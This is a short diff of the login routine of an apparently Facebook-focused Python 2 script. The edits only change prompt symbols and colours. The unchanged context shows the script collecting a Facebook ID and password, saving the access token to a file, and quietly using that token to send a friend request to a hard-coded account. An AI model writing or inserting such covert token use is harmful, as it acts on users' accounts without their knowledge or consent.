@@ -120,14 +120,14 @@ def login():
 		os.system('clear')
 		print logo
 		print('	   \033[1;96m【\x1b[1;96mLOGIN WITH FACEBOOK\x1b[1;96m】' )
-		print(' \033[1;91mWarning: Do Not Use Your Personal Account' )
-		id = raw_input('\033[1;93m❥ \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;92m')
-		pwd = raw_input('\033[1;93m❥ \x1b[1;93mPassword\x1b[1;93m: \x1b[1;92m')
+		print(' \033[1;91m☠Warning: Do Not Use Your Personal Account' )
+		id = raw_input('\033[1;96m☞ \x1b[1;93mID/Email\x1b[1;93m: \x1b[1;96m')
+		pwd = raw_input('\033[1;96m☞ \x1b[1;93mPassword\x1b[1;93m: \x1b[1;96m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+			print"\n\033[1;91m☠ \x1b[1;91mThere is no internet connection"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -149,7 +149,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m[âœ“] \x1b[1;92mLogin Successful'
+				print '\n\033[1;96m✌ \x1b[1;92mLogin Successful'
 				os.system('xdg-open https://www.Facebook.com/Omi6t')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
